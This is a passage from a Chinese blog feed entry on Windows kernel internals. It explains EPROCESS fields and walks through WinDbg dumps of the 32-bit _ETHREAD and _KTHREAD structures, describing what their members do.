Int21Descriptor：历史遗留问题，16位<code>Windows</code>段选择子不够，每个进程都有一个<code>LDT</code>表，<code>Int21Descriptor</code>是<code>DOS</code>下要用的。</li><li>Affinity：保存该进程可以在哪个CPU上跑，从最低位到最高位（分别表示 0 号，1 号…n 号 CPU），对应的每一位中，置 1 表示可以，置 0 表示不可以。32 位系统该字段 4 个字节 32 位，所以最多支持 32 核 CPU，64 位系统同理也只能支持 64 核，除非后续扩充了其它字段。例如，该字段为 5，则表示该进程只能在 0 号和 2 号 CPU 上跑。</li><li>BasePriority：基础优先级或最低优先级，该进程中的所有线程最起码的优先级。</li><li>UniqueProcessId：进程的编号，也就是任务管理器中显示的<code>PID</code>。</li><li>ActiveProcessLinks：所有的活动进程都连接在一起，构成的双向链表。全局变量 <code>PsActiveProcessHead</code> 指向这个全局链的表头。如下是示意图：</li></ul><img src="/2025/01/24/WindowsProcess1/1.png" class=""><ul><li>VadRoot：指示了进程的线性地址的使用情况和记录。</li><li>DebugPort &#x2F; ExceptionPort：调试相关字段。</li><li>ObjectTable：句柄表，装着内核对象句柄，是用来标识某个内核对象的一个<code>id</code>，同一个对象的该<code>id</code>对于每个进程是不同的。后面的教程将会对句柄表进行讲解。</li><li>ImageFileName：进程镜像文件名，最多16个字节。</li><li>ActiveThreads：活动线程的数量。</li><li>Peb：即 <code>Process Environment Block</code>，进程环境块。是进程在3环的一个结构体，里面包含了进程的模块列表、是否处于调试状态等信息。</li></ul><h2 id="ETHREAD"><a href="#ETHREAD" class="headerlink" title="ETHREAD"></a>ETHREAD</h2><h3 id="定义描述-1"><a href="#定义描述-1" class="headerlink" title="定义描述"></a>定义描述</h3><p>虽然在系统调用那一章节介绍过了，但是还是再额外提及一下。</p><p>结构体描述：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _ETHREAD</span><br><span class="line">nt!_ETHREAD</span><br><span class="line">   <span class="number">+0x000</span> Tcb              : _KTHREAD</span><br><span class="line">   <span class="number">+0x200</span> CreateTime       : _LARGE_INTEGER</span><br><span class="line">   <span class="number">+0x208</span> ExitTime         : _LARGE_INTEGER</span><br><span class="line">   <span class="number">+0x208</span> KeyedWaitChain   : _LIST_ENTRY</span><br><span class="line">   <span class="number">+0x210</span> ExitStatus       : Int4B</span><br><span class="line">   <span class="number">+0x214</span> PostBlockList    : _LIST_ENTRY</span><br><span class="line">   <span class="number">+0x214</span> ForwardLinkShadow : Ptr32 Void</span><br><span class="line">   <span class="number">+0x218</span> StartAddress     : Ptr32 Void</span><br><span class="line">   <span class="number">+0x21c</span> TerminationPort  : Ptr32 _TERMINATION_PORT</span><br><span class="line">   <span class="number">+0x21c</span> ReaperLink       : Ptr32 _ETHREAD</span><br><span class="line">   <span class="number">+0x21c</span> KeyedWaitValue   : Ptr32 Void</span><br><span class="line">   <span class="number">+0x220</span> ActiveTimerListLock : Uint4B</span><br><span class="line">   <span class="number">+0x224</span> ActiveTimerListHead : _LIST_ENTRY</span><br><span class="line">   <span class="number">+0x22c</span> Cid              : _CLIENT_ID</span><br><span class="line">   <span class="number">+0x234</span> KeyedWaitSemaphore : _KSEMAPHORE</span><br><span class="line">   <span class="number">+0x234</span> AlpcWaitSemaphore : _KSEMAPHORE</span><br><span class="line">   <span class="number">+0x248</span> ClientSecurity   : _PS_CLIENT_SECURITY_CONTEXT</span><br><span class="line">   <span class="number">+0x24c</span> IrpList          : _LIST_ENTRY</span><br><span class="line">   <span class="number">+0x254</span> TopLevelIrp      : Uint4B</span><br><span class="line">   <span class="number">+0x258</span> DeviceToVerify   : Ptr32 _DEVICE_OBJECT</span><br><span class="line">   <span class="number">+0x25c</span> CpuQuotaApc      : Ptr32 _PSP_CPU_QUOTA_APC</span><br><span class="line">   <span class="number">+0x260</span> Win32StartAddress : Ptr32 Void</span><br><span class="line">   <span class="number">+0x264</span> LegacyPowerObject : Ptr32 Void</span><br><span class="line">   <span class="number">+0x268</span> ThreadListEntry  : _LIST_ENTRY</span><br><span class="line">   <span class="number">+0x270</span> RundownProtect   : _EX_RUNDOWN_REF</span><br><span class="line">   <span class="number">+0x274</span> ThreadLock       : _EX_PUSH_LOCK</span><br><span class="line">   <span class="number">+0x278</span> ReadClusterSize  : Uint4B</span><br><span class="line">   <span class="number">+0x27c</span> MmLockOrdering   : Int4B</span><br><span class="line">   <span class="number">+0x280</span> CrossThreadFlags : Uint4B</span><br><span class="line">   <span class="number">+0x280</span> Terminated       : Pos <span class="number">0</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x280</span> ThreadInserted   : Pos <span class="number">1</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x280</span> HideFromDebugger : Pos <span class="number">2</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x280</span> ActiveImpersonationInfo : Pos <span class="number">3</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x280</span> Reserved         : Pos <span class="number">4</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x280</span> HardErrorsAreDisabled : Pos <span class="number">5</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x280</span> BreakOnTermination : Pos <span class="number">6</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x280</span> SkipCreationMsg  : Pos <span class="number">7</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x280</span> SkipTerminationMsg : Pos <span class="number">8</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x280</span> CopyTokenOnOpen  : Pos <span class="number">9</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x280</span> ThreadIoPriority : Pos <span class="number">10</span>, <span class="number">3</span> Bits</span><br><span class="line">   <span class="number">+0x280</span> ThreadPagePriority : Pos <span class="number">13</span>, <span class="number">3</span> Bits</span><br><span class="line">   <span class="number">+0x280</span> RundownFail      : Pos <span class="number">16</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x280</span> NeedsWorkingSetAging : Pos <span class="number">17</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x284</span> SameThreadPassiveFlags : Uint4B</span><br><span class="line">   <span class="number">+0x284</span> ActiveExWorker   : Pos <span class="number">0</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x284</span> ExWorkerCanWaitUser : Pos <span class="number">1</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x284</span> MemoryMaker      : Pos <span class="number">2</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x284</span> ClonedThread     : Pos <span class="number">3</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x284</span> KeyedEventInUse  : Pos <span class="number">4</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x284</span> RateApcState     : Pos <span class="number">5</span>, <span class="number">2</span> Bits</span><br><span class="line">   <span class="number">+0x284</span> SelfTerminate    : Pos <span class="number">7</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x288</span> SameThreadApcFlags : Uint4B</span><br><span class="line">   <span class="number">+0x288</span> Spare            : Pos <span class="number">0</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x288</span> StartAddressInvalid : Pos <span class="number">1</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x288</span> EtwPageFaultCalloutActive : Pos <span class="number">2</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x288</span> OwnsProcessWorkingSetExclusive : Pos <span class="number">3</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x288</span> OwnsProcessWorkingSetShared : Pos <span class="number">4</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x288</span> OwnsSystemCacheWorkingSetExclusive : Pos <span class="number">5</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x288</span> OwnsSystemCacheWorkingSetShared : Pos <span class="number">6</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x288</span> OwnsSessionWorkingSetExclusive : Pos <span class="number">7</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x289</span> OwnsSessionWorkingSetShared : Pos <span class="number">0</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x289</span> OwnsProcessAddressSpaceExclusive : Pos <span class="number">1</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x289</span> OwnsProcessAddressSpaceShared : Pos <span class="number">2</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x289</span> SuppressSymbolLoad : Pos <span class="number">3</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x289</span> Prefetching      : Pos <span class="number">4</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x289</span> OwnsDynamicMemoryShared : Pos <span class="number">5</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x289</span> OwnsChangeControlAreaExclusive : Pos <span class="number">6</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x289</span> OwnsChangeControlAreaShared : Pos <span class="number">7</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x28a</span> OwnsPagedPoolWorkingSetExclusive : Pos <span class="number">0</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x28a</span> OwnsPagedPoolWorkingSetShared : Pos <span class="number">1</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x28a</span> OwnsSystemPtesWorkingSetExclusive : Pos <span class="number">2</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x28a</span> OwnsSystemPtesWorkingSetShared : Pos <span class="number">3</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x28a</span> TrimTrigger      : Pos <span class="number">4</span>, <span class="number">2</span> Bits</span><br><span class="line">   <span class="number">+0x28a</span> Spare1           : Pos <span class="number">6</span>, <span class="number">2</span> Bits</span><br><span class="line">   <span class="number">+0x28b</span> PriorityRegionActive : UChar</span><br><span class="line">   <span class="number">+0x28c</span> CacheManagerActive : UChar</span><br><span class="line">   <span class="number">+0x28d</span> DisablePageFaultClustering : UChar</span><br><span class="line">   <span class="number">+0x28e</span> ActiveFaultCount : UChar</span><br><span class="line">   <span class="number">+0x28f</span> LockOrderState   : UChar</span><br><span class="line">   <span class="number">+0x290</span> AlpcMessageId    : Uint4B</span><br><span class="line">   <span class="number">+0x294</span> AlpcMessage      : Ptr32 Void</span><br><span class="line">   <span class="number">+0x294</span> AlpcReceiveAttributeSet : Uint4B</span><br><span class="line">   <span class="number">+0x298</span> AlpcWaitListEntry : _LIST_ENTRY</span><br><span class="line">   <span class="number">+0x2a0</span> CacheManagerCount : Uint4B</span><br><span class="line">   <span class="number">+0x2a4</span> IoBoostCount     : Uint4B</span><br><span class="line">   <span class="number">+0x2a8</span> IrpListLock      : Uint4B</span><br><span class="line">   <span class="number">+0x2ac</span> ReservedForSynchTracking : Ptr32 Void</span><br><span class="line">   <span class="number">+0x2b0</span> CmCallbackListHead : _SINGLE_LIST_ENTRY</span><br><span class="line">   <span class="number">+0x2b4</span> KernelStackReference : Uint4B</span><br></pre></td></tr></table></figure><p>其中 <code>KTHREAD</code> 结构如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _KTHREAD</span><br><span class="line">nt!_KTHREAD</span><br><span class="line">   <span class="number">+0x000</span> Header           : _DISPATCHER_HEADER</span><br><span class="line">   <span class="number">+0x010</span> CycleTime        : Uint8B</span><br><span class="line">   <span class="number">+0x018</span> HighCycleTime    : Uint4B</span><br><span class="line">   <span class="number">+0x020</span> QuantumTarget    : Uint8B</span><br><span class="line">   <span class="number">+0x028</span> InitialStack     : Ptr32 Void</span><br><span class="line">   <span class="number">+0x02c</span> StackLimit       : Ptr32 Void</span><br><span class="line">   <span class="number">+0x030</span> KernelStack      : Ptr32 Void</span><br><span class="line">   <span class="number">+0x034</span> ThreadLock       : Uint4B</span><br><span class="line">   <span class="number">+0x038</span> WaitRegister     : _KWAIT_STATUS_REGISTER</span><br><span class="line">   <span class="number">+0x039</span> Running          : UChar</span><br><span class="line">   <span class="number">+0x03a</span> Alerted          : [<span class="number">2</span>] UChar</span><br><span class="line">   <span class="number">+0x03c</span> KernelStackResident : Pos <span class="number">0</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x03c</span> ReadyTransition  : Pos <span class="number">1</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x03c</span> ProcessReadyQueue : Pos <span class="number">2</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x03c</span> WaitNext         : Pos <span class="number">3</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x03c</span> SystemAffinityActive : Pos <span class="number">4</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x03c</span> Alertable        : Pos <span class="number">5</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x03c</span> GdiFlushActive   : Pos <span class="number">6</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x03c</span> UserStackWalkActive : Pos <span class="number">7</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x03c</span> ApcInterruptRequest : Pos <span class="number">8</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x03c</span> ForceDeferSchedule : Pos <span class="number">9</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x03c</span> QuantumEndMigrate : Pos <span class="number">10</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x03c</span> UmsDirectedSwitchEnable : Pos <span class="number">11</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x03c</span> TimerActive      : Pos <span class="number">12</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x03c</span> SystemThread     : Pos <span class="number">13</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x03c</span> Reserved         : Pos <span class="number">14</span>, <span class="number">18</span> Bits</span><br><span class="line">   <span class="number">+0x03c</span> MiscFlags        : Int4B</span><br><span class="line">   <span class="number">+0x040</span> ApcState         : _KAPC_STATE</span><br><span class="line">   <span class="number">+0x040</span> ApcStateFill     : [<span class="number">23</span>] UChar</span><br><span class="line">   <span class="number">+0x057</span> Priority         : Char</span><br><span class="line">   <span class="number">+0x058</span> NextProcessor    : Uint4B</span><br><span class="line">   <span class="number">+0x05c</span> DeferredProcessor : Uint4B</span><br><span class="line">   <span class="number">+0x060</span> ApcQueueLock     : Uint4B</span><br><span class="line">   <span class="number">+0x064</span> ContextSwitches  : Uint4B</span><br><span class="line">   <span class="number">+0x068</span> State            : UChar</span><br><span class="line">   <span class="number">+0x069</span> NpxState         : Char</span><br><span class="line">   <span class="number">+0x06a</span> WaitIrql         : UChar</span><br><span class="line">   <span class="number">+0x06b</span> WaitMode         : Char</span><br><span class="line">   <span class="number">+0x06c</span> WaitStatus       : Int4B</span><br><span class="line">   <span class="number">+0x070</span> WaitBlockList    : Ptr32 _KWAIT_BLOCK</span><br><span class="line">   <span class="number">+0x074</span> WaitListEntry    : _LIST_ENTRY</span><br><span class="line">   <span class="number">+0x074</span> SwapListEntry    : _SINGLE_LIST_ENTRY</span><br><span class="line">   <span class="number">+0x07c</span> Queue            : Ptr32 _KQUEUE</span><br><span class="line">   <span class="number">+0x080</span> WaitTime         : Uint4B</span><br><span class="line">   <span class="number">+0x084</span> KernelApcDisable : Int2B</span><br><span class="line">   <span class="number">+0x086</span> SpecialApcDisable : Int2B</span><br><span class="line">   <span class="number">+0x084</span> CombinedApcDisable : Uint4B</span><br><span class="line">   <span class="number">+0x088</span> Teb              : Ptr32 Void</span><br><span class="line">   <span class="number">+0x090</span> Timer            : _KTIMER</span><br><span class="line">   <span class="number">+0x0b8</span> AutoAlignment    : Pos <span class="number">0</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x0b8</span> DisableBoost     : Pos <span class="number">1</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x0b8</span> EtwStackTraceApc1Inserted : Pos <span class="number">2</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x0b8</span> EtwStackTraceApc2Inserted : Pos <span class="number">3</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x0b8</span> CalloutActive    : Pos <span class="number">4</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x0b8</span> ApcQueueable     : Pos <span class="number">5</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x0b8</span> EnableStackSwap  : Pos <span class="number">6</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x0b8</span> GuiThread        : Pos <span class="number">7</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x0b8</span> UmsPerformingSyscall : Pos <span class="number">8</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x0b8</span> VdmSafe          : Pos <span class="number">9</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x0b8</span> UmsDispatched    : Pos <span class="number">10</span>, <span class="number">1</span> Bit</span><br><span class="line">   <span class="number">+0x0b8</span> ReservedFlags    : Pos <span class="number">11</span>, <span class="number">21</span> Bits</span><br><span class="line">   <span class="number">+0x0b8</span> ThreadFlags      : Int4B</span><br><span class="line">   <span class="number">+0x0bc</span> ServiceTable     : Ptr32 Void</span><br><span class="line">   <span class="number">+0x0c0</span> WaitBlock        : [<span class="number">4</span>] _KWAIT_BLOCK</span><br><span class="line">   <span class="number">+0x120</span> QueueListEntry   : _LIST_ENTRY</span><br><span class="line">   <span class="number">+0x128</span> TrapFrame        : Ptr32 _KTRAP_FRAME</span><br><span class="line">   <span class="number">+0x12c</span> FirstArgument    : Ptr32 Void</span><br><span class="line">   <span class="number">+0x130</span> CallbackStack    : Ptr32 Void</span><br><span class="line">   <span class="number">+0x130</span> CallbackDepth    : Uint4B</span><br><span class="line">   <span class="number">+0x134</span> ApcStateIndex    : UChar</span><br><span class="line">   <span class="number">+0x135</span> BasePriority     : Char</span><br><span class="line">   <span class="number">+0x136</span> PriorityDecrement : Char</span><br><span class="line">   <span class="number">+0x136</span> ForegroundBoost  : Pos <span class="number">0</span>, <span class="number">4</span> Bits</span><br><span class="line">   <span class="number">+0x136</span> UnusualBoost     : Pos <span class="number">4</span>, <span class="number">4</span> Bits</span><br><span class="line">   <span class="number">+0x137</span> Preempted        : UChar</span><br><span class="line">   <span class="number">+0x138</span> AdjustReason     : UChar</span><br><span class="line">   <span class="number">+0x139</span> AdjustIncrement  : Char</span><br><span class="line">   <span class="number">+0x13a</span> PreviousMode     : Char</span><br><span class="line">   <span class="number">+0x13b</span> Saturation       : Char</span><br><span class="line">   <span class="number">+0x13c</span> SystemCallNumber : Uint4B</span><br><span class="line">   <span class="number">+0x140</span> FreezeCount      : Uint4B</span><br><span class="line">   <span class="number">+0x144</span> UserAffinity     : _GROUP_AFFINITY</span><br><span class="line">   <span class="number">+0x150</span> Process          : Ptr32 _KPROCESS</span><br><span class="line">   <span class="number">+0x154</span> Affinity         : _GROUP_AFFINITY</span><br><span class="line">   <span class="number">+0x160</span> IdealProcessor   : Uint4B</span><br><span class="line">   <span class="number">+0x164</span> UserIdealProcessor : Uint4B</span><br><span class="line">   <span class="number">+0x168</span> ApcStatePointer  : [<span class="number">2</span>] Ptr32 _KAPC_STATE</span><br><span class="line">   <span class="number">+0x170</span> SavedApcState    : _KAPC_STATE</span><br><span class="line">   <span class="number">+0x170</span> SavedApcStateFill : [<span class="number">23</span>] UChar</span><br><span class="line">   <span class="number">+0x187</span> WaitReason       : UChar</span><br><span class="line">   <span class="number">+0x188</span> SuspendCount     : Char</span><br><span class="line">   <span class="number">+0x189</span> Spare1           : Char</span><br><span class="line">   <span class="number">+0x18a</span> OtherPlatformFill : UChar</span><br><span class="line">   <span class="number">+0x18c</span> Win32Thread      : Ptr32 Void</span><br><span class="line">   <span class="number">+0x190</span> StackBase        : Ptr32 Void</span><br><span class="line">   <span class="number">+0x194</span> SuspendApc       : _KAPC</span><br><span class="line">   <span class="number">+0x194</span> SuspendApcFill0  : [<span class="number">1</span>] UChar</span><br><span class="line">   <span class="number">+0x195</span> ResourceIndex    : UChar</span><br><span class="line">   <span class="number">+0x194</span> SuspendApcFill1  : [<span class="number">3</span>] UChar</span><br><span class="line">   <span class="number">+0x197</span> QuantumReset     : UChar</span><br><span class="line">   <span class="number">+0x194</span> SuspendApcFill2  : [<span class="number">4</span>] UChar</span><br><span class="line">   <span class="number">+0x198</span> KernelTime       : Uint4B</span><br><span class="line">   <span class="number">+0x194</span> SuspendApcFill3  : [<span class="number">36</span>] UChar</span><br><span class="line">   <span class="number">+0x1b8</span> WaitPrcb         : Ptr32 _KPRCB</span><br><span class="line">   <span class="number">+0x194</span> SuspendApcFill4  : [<span class="number">40</span>] UChar</span><br><span class="line">   <span class="number">+0x1bc</span> LegoData         : Ptr32 Void</span><br><span class="line">   <span class="number">+0x194</span> SuspendApcFill5  : [<span class="number">47</span>] UChar</span><br><span class="line">   <span class="number">+0x1c3</span> LargeStack       : UChar</span><br><span class="line">   <span class="number">+0x1c4</span> UserTime         : Uint4B</span><br><span class="line">   <span class="number">+0x1c8</span> SuspendSemaphore : _KSEMAPHORE</span><br><span class="line">   <span class="number">+0x1c8</span> SuspendSemaphorefill : [<span class="number">20</span>] UChar</span><br><span class="line">   <span class="number">+0x1dc</span> SListFaultCount  : Uint4B</span><br><span class="line">   <span class="number">+0x1e0</span> ThreadListEntry  : _LIST_ENTRY</span><br><span class="line">   <span class="number">+0x1e8</span> MutantListHead   : _LIST_ENTRY</span><br><span class="line">   <span class="number">+0x1f0</span> SListFaultAddress : Ptr32 Void</span><br><span class="line">   <span class="number">+0x1f4</span> ThreadCounters   : Ptr32 _KTHREAD_COUNTERS</span><br><span class="line">   <span class="number">+0x1f8</span> XStateSave       : Ptr32 _XSTATE_SAVE</span><br></pre></td></tr></table></figure><h3 id="成员信息-1"><a href="#成员信息-1" class="headerlink" title="成员信息"></a>成员信息</h3><ul><li>Header：同 <code>EPROCESS</code> 对应的成员。</li><li>InitialStack &#x2F; StackLimit &#x2F; KernelStack：这三个成员十分重要，与线程切换相关。<code>KernelStack</code>为当前切换线程的<code>esp</code>，它们的细节将会在后面的随笔介绍。</li><li>Teb：英文全称为<code>Thread Environment Block</code>，意为线程环境块，大小4KB，位于用户地址空间。在3环时，<code>fs</code>寄存器中存储该结构。</li><li>DebugActive：如果值为-1，则不能使用调试寄存器<code>Dr0</code> - <code>Dr7</code>。</li><li>ApcState &#x2F; ApcQueueLock &#x2F; ApcStatePointer &#x2F; SavedApcState：<code>APC</code>相关。</li><li>State：指示线程状态：<code>waiting</code>&#x2F;<code>ready</code>&#x2F;<code>running</code>。</li><li>BasePriority：其初始值是所属进程的<code>BasePriority</code>值，以后可以通过<code>KeSetBasePriorityThread</code>函数重新设定。</li><li>WaitBlock：里面存储了等待哪个对象，比如调用<code>WaitForSingleObject</code>。</li><li>ServiceTable：指向系统服务表基址。</li><li>TrapFrame：存储着进0环时保存环境。</li><li>PreviousMode：先前模式，指示程序是0环调用还是3环调用的。</li><li>ThreadListEntry：一个进程所有的线程，都挂在一个双向链表中，一共有两个这样的链表，<code>KTHREAD</code>一个，<code>ETHREAD</code>外面一个，示意图如下：</li></ul><img src="/2025/01/24/WindowsProcess1/2.png" class=""><ul><li>Cid：存储着进程ID和线程ID。</li><li>Process：指向自己所属进程。</li></ul><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>[1]：<a href="https://www.cnblogs.com/wingsummer/p/15595114.html">https://www.cnblogs.com/wingsummer/p/15595114.html</a></li></ul>]]></content>
    
    
    <summary type="html">来学习一下进程与线程的结构</summary>
    
    
    
    <category term="计算机系统" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="Windows" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/"/>
    
    <category term="进程与线程" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/%E8%BF%9B%E7%A8%8B%E4%B8%8E%E7%BA%BF%E7%A8%8B/"/>
    
    
  </entry>
  
  <entry>
    <title>windows系统调用学习——系统描述符表</title>
    <link href="https://xia0ji233.github.io/2025/01/24/WindowsSyscall4/"/>
    <id>https://xia0ji233.github.io/2025/01/24/WindowsSyscall4/</id>
    <published>2025-01-24T02:00:00.000Z</published>
    <updated>2025-01-24T02:49:32.572Z</updated>
    
